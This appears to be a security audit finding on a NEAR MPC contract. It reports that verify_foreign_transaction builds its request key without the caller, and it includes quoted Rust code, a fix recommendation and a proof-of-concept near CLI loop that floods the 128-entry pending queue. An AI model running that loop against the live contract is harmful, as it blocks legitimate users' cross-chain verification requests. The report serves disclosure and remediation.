### Title
Caller-Agnostic Request Key in `verify_foreign_transaction` Allows Unprivileged Queue Saturation, Blocking Legitimate Foreign-Chain Verification - (File: `crates/contract/src/lib.rs`)

### Summary

The `verify_foreign_transaction` endpoint uses a request key that does **not** include the caller's account ID. Any unprivileged account can submit 128 identical requests (costing 128 yoctoNEAR total) to saturate the bounded fan-out queue for a specific foreign-chain transaction, permanently blocking all subsequent legitimate callers from queuing that same request until the attacker's yields time out — at which point the attacker can immediately refill the queue.

### Finding Description

The `sign` and `request_app_private_key` endpoints both bind the caller's `predecessor_account_id` into their request key:

`sign` at `crates/contract/src/lib.rs:379–384`:
```rust
let request = SignatureRequest::new(
    request.domain_id,
    request.payload,
    &predecessor,   // ← caller is part of the key
    &request.path,
);
```

`request_app_private_key` at `crates/contract/src/lib.rs:493–498`:
```rust
let request = CKDRequest::new(
    request.app_public_key,
    domain_id,
    &predecessor,   // ← caller is part of the key
    &request.derivation_path,
);
```

By contrast, `verify_foreign_transaction` at `crates/contract/src/lib.rs:526–556` calls `check_request_preconditions` but **discards** the returned `(domain_config, predecessor)` tuple entirely, then constructs the request key without the caller:

```rust
self.check_request_preconditions(   // return value discarded
    request.domain_id,
    DomainPurpose::ForeignTx,
    ...
);
// ...
let request = args_into_verify_foreign_tx_request(request);
```

`args_into_verify_foreign_tx_request` at `crates/contract/src/dto_mapping.rs:840–848` maps only `domain_id`, `request`, and `payload_version` — no caller field:

```rust
pub fn args_into_verify_foreign_tx_request(
    args: dtos::VerifyForeignTransactionRequestArgs,
) -> dtos::VerifyForeignTransactionRequest {
    dtos::VerifyForeignTransactionRequest {
        domain_id: args.domain_id,
        request: args.request,
        payload_version: args.payload_version,
    }
}
```

The `VerifyForeignTransactionRequest` struct at `crates/near-mpc-contract-interface/src/types/foreign_chain.rs:124–128` confirms no caller field exists:

```rust
pub struct VerifyForeignTransactionRequest {
    pub request: ForeignChainRpcRequest,
    pub domain_id: DomainId,
    pub payload_version: ForeignTxPayloadVersion,
}
```

The contract's own unit test at `crates/contract/src/lib.rs:3208–3263` explicitly documents this behavior — alice and bob submitting the same request both queue under the **same caller-agnostic key**:

```
// Then: both yields are queued under the single (caller-agnostic) request key.
```

The fan-out queue is capped at `MAX_PENDING_REQUEST_FAN_OUT = 128` in `crates/contract/src/pending_requests.rs:37`. Once full, `push_pending_yield` panics with `PendingRequestQueueFull` at `crates/contract/src/pending_requests.rs:51–57`:

```rust
if queue.len() >= usize::from(MAX_PENDING_REQUEST_FAN_OUT) {
    env::panic_str(
        &RequestError::PendingRequestQueueFull { limit: MAX_PENDING_REQUEST_FAN_OUT }
            .to_string(),
    );
}
```

### Impact Explanation

An attacker who observes a pending `verify_foreign_transaction` request on-chain (all parameters are public: `domain_id`, `ForeignChainRpcRequest`, `payload_version`) can submit 128 identical calls, each requiring only 1 yoctoNEAR deposit. This saturates the queue for that specific foreign-chain transaction. Every subsequent legitimate caller attempting to verify the same transaction receives `PendingRequestQueueFull` and is denied. The attacker's 128 yields eventually time out via `return_verify_foreign_tx_and_clean_state_on_success` → `pop_oldest_pending_yield` (`crates/contract/src/lib.rs:2316–2338`), but the attacker can immediately resubmit 128 more requests to maintain the blockade at negligible cost.

This breaks the request-lifecycle safety invariant for the foreign-chain verification flow: a legitimate user who needs a specific cross-chain transaction verified and signed cannot get their request processed, which can prevent valid bridge execution or cause time-sensitive cross-chain operations to fail.

**Impact class:** Medium — request-lifecycle and contract execution-flow manipulation that breaks production safety invariants without relying on network-level DoS or operator misconfiguration.

### Likelihood Explanation

- All request parameters needed to reproduce the attack are observable on-chain the moment a legitimate `verify_foreign_transaction` call is included in a block.
- The cost is 128 yoctoNEAR per saturation cycle — effectively free.
- No privileged access, key material, or threshold collusion is required; any NEAR account suffices.
- The attacker can sustain the blockade indefinitely by resubmitting before the previous batch times out.

### Recommendation

Include the caller's `predecessor_account_id` in the `VerifyForeignTransactionRequest` key, mirroring the pattern used by `sign` and `request_app_private_key`. Concretely:

1. Add a `predecessor: AccountId` field to `VerifyForeignTransactionRequest` (and `VerifyForeignTransactionRequestArgs` if needed, or derive it on the contract side).
2. In `verify_foreign_transaction`, capture the `predecessor` returned by `check_request_preconditions` and pass it into `args_into_verify_foreign_tx_request` (or a new constructor), so the stored key is `(domain_id, request, payload_version, predecessor)`.
3. Update `respond_verify_foreign_tx` and the MPC node's indexer/handler accordingly to supply the correct caller when constructing the lookup key.

This ensures that an attacker can only fill their own queue slot (128 entries keyed to their own account), not the shared slot for a victim's transaction.

### Proof of Concept

```
# 1. Alice submits a legitimate verify_foreign_transaction for Bitcoin tx_id=[7u8;32]
near call v1.signer verify_foreign_transaction \
  '{"request":{"Bitcoin":{"tx_id":"0707...07","confirmations":2,"extractors":["BlockHash"]}},"domain_id":0,"payload_version":1}' \
  --deposit-yocto 1 --gas 300000000000000 --account-id alice.near

# 2. Attacker observes the request parameters on-chain (all public).
#    Attacker submits 128 identical calls from attacker.near:
for i in $(seq 1 128); do
  near call v1.signer verify_foreign_transaction \
    '{"request":{"Bitcoin":{"tx_id":"0707...07","confirmations":2,"extractors":["BlockHash"]}},"domain_id":0,"payload_version":1}' \
    --deposit-yocto 1 --gas 300000000000000 --account-id attacker.near
done

# 3. Any subsequent caller (including alice retrying) receives:
#    "PendingRequestQueueFull: limit 128"
near call v1.signer verify_foreign_transaction \
  '{"request":{"Bitcoin":{"tx_id":"0707...07","confirmations":2,"extractors":["BlockHash"]}},"domain_id":0,"payload_version":1}' \
  --deposit-yocto 1 --gas 300000000000000 --account-id alice.near
# → panics: PendingRequestQueueFull { limit: 128 }
```

The contract unit test `verify_foreign_transaction__should_queue_duplicates_from_different_callers` at `crates/contract/src/lib.rs:3208` already demonstrates that alice and bob's submissions share the same queue entry, confirming the caller-agnostic key is the root cause. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5) [7](#0-6)

### Citations

**File:** crates/contract/src/lib.rs (L379-384)
```rust
        let request = SignatureRequest::new(
            request.domain_id,
            request.payload,
            &predecessor,
            &request.path,
        );
```

**File:** crates/contract/src/lib.rs (L519-557)
```rust
    pub fn verify_foreign_transaction(&mut self, request: VerifyForeignTransactionRequestArgs) {
        log!(
            "verify_foreign_transaction: predecessor={:?}, request={:?}",
            env::predecessor_account_id(),
            request
        );

        self.check_request_preconditions(
            request.domain_id,
            DomainPurpose::ForeignTx,
            Gas::from_tgas(self.config.sign_call_gas_attachment_requirement_tera_gas),
            MINIMUM_SIGN_REQUEST_DEPOSIT,
        );

        let requested_chain = request.request.chain();
        let supported_chains = self.get_supported_foreign_chains();
        if !supported_chains.contains(&requested_chain) {
            env::panic_str(
                &InvalidParameters::ForeignChainNotSupported {
                    requested: requested_chain,
                }
                .to_string(),
            );
        }

        let callback_gas = Gas::from_tgas(
            self.config
                .return_signature_and_clean_state_on_success_call_tera_gas,
        );

        let request = args_into_verify_foreign_tx_request(request);
        let callback_args = serde_json::to_vec(&(&request,)).unwrap();
        self.enqueue_yield_request(
            method_names::RETURN_VERIFY_FOREIGN_TX_AND_CLEAN_STATE_ON_SUCCESS,
            callback_args,
            callback_gas,
            move |this, id| this.add_verify_foreign_tx_request(request, id),
        );
    }
```

**File:** crates/contract/src/lib.rs (L2316-2338)
```rust
    pub fn return_verify_foreign_tx_and_clean_state_on_success(
        &mut self,
        request: VerifyForeignTransactionRequest,
        #[callback_result] response: Result<VerifyForeignTransactionResponse, PromiseError>,
    ) -> PromiseOrValue<VerifyForeignTransactionResponse> {
        match response {
            Ok(response) => PromiseOrValue::Value(response),
            Err(_) => {
                pending_requests::pop_oldest_pending_yield(
                    &mut self.pending_verify_foreign_tx_requests,
                    &request,
                );
                let fail_on_timeout_gas = Gas::from_tgas(self.config.fail_on_timeout_tera_gas);
                let promise = Promise::new(env::current_account_id()).function_call(
                    method_names::FAIL_ON_TIMEOUT.to_string(),
                    vec![],
                    NearToken::from_near(0),
                    fail_on_timeout_gas,
                );
                near_sdk::PromiseOrValue::Promise(promise.as_return())
            }
        }
    }
```

**File:** crates/contract/src/lib.rs (L3208-3263)
```rust
    #[test]
    fn verify_foreign_transaction__should_queue_duplicates_from_different_callers() {
        // Given: two different callers will submit the same foreign-tx verification request.
        let mut rng = rand::rngs::StdRng::from_seed([42u8; 32]);
        let (context, mut contract, secret_key) =
            basic_setup_with_protocol(Protocol::CaitSith, DomainPurpose::ForeignTx, &mut rng);
        register_supported_chains(&mut contract, [dtos::ForeignChain::Bitcoin]);
        let SharedSecretKey::Secp256k1(secret_key) = secret_key else {
            unreachable!();
        };

        let request_args = VerifyForeignTransactionRequestArgs {
            domain_id: DomainId::default().0.into(),
            payload_version: ForeignTxPayloadVersion::V1,
            request: dtos::ForeignChainRpcRequest::Bitcoin(BitcoinRpcRequest {
                tx_id: [7u8; 32].into(),
                confirmations: 2.into(),
                extractors: vec![BitcoinExtractor::BlockHash],
            }),
        };
        let request = args_into_verify_foreign_tx_request(request_args.clone());

        // When: caller alice submits the request.
        let alice = AccountId::from_str("alice.near").unwrap();
        testing_env!(
            VMContextBuilder::new()
                .signer_account_id(alice.clone())
                .predecessor_account_id(alice)
                .current_account_id(context.current_account_id.clone())
                .attached_deposit(NearToken::from_yoctonear(1))
                .build()
        );
        contract.verify_foreign_transaction(request_args.clone());

        // And: caller bob submits the identical request — a different account would today
        // be blocked from receiving a response by alice's submission.
        let bob = AccountId::from_str("bob.near").unwrap();
        testing_env!(
            VMContextBuilder::new()
                .signer_account_id(bob.clone())
                .predecessor_account_id(bob)
                .current_account_id(context.current_account_id.clone())
                .attached_deposit(NearToken::from_yoctonear(1))
                .build()
        );
        contract.verify_foreign_transaction(request_args);

        // Then: both yields are queued under the single (caller-agnostic) request key.
        assert_eq!(
            contract
                .pending_verify_foreign_tx_requests
                .get(&request)
                .map(|q| q.len()),
            Some(2),
            "duplicate foreign-tx requests from different callers should fan out",
        );
```

**File:** crates/contract/src/dto_mapping.rs (L840-848)
```rust
pub fn args_into_verify_foreign_tx_request(
    args: dtos::VerifyForeignTransactionRequestArgs,
) -> dtos::VerifyForeignTransactionRequest {
    dtos::VerifyForeignTransactionRequest {
        domain_id: args.domain_id,
        request: args.request,
        payload_version: args.payload_version,
    }
}
```

**File:** crates/near-mpc-contract-interface/src/types/foreign_chain.rs (L124-128)
```rust
pub struct VerifyForeignTransactionRequest {
    pub request: ForeignChainRpcRequest,
    pub domain_id: DomainId,
    pub payload_version: ForeignTxPayloadVersion,
}
```

**File:** crates/contract/src/pending_requests.rs (L37-58)
```rust
pub const MAX_PENDING_REQUEST_FAN_OUT: u8 = 128;

/// Append a yield index to the pending-request fan-out queue for `request`.
///
/// Panics with `RequestError::PendingRequestQueueFull` if the resulting queue would
/// exceed `MAX_PENDING_REQUEST_FAN_OUT`.
pub(crate) fn push_pending_yield<K>(
    requests: &mut LookupMap<K, Vec<YieldIndex>>,
    request: K,
    data_id: CryptoHash,
) where
    K: BorshSerialize + BorshDeserialize + Clone + Ord,
{
    let queue = requests.entry(request).or_default();
    if queue.len() >= usize::from(MAX_PENDING_REQUEST_FAN_OUT) {
        env::panic_str(
            &RequestError::PendingRequestQueueFull {
                limit: MAX_PENDING_REQUEST_FAN_OUT,
            }
            .to_string(),
        );
    }
```
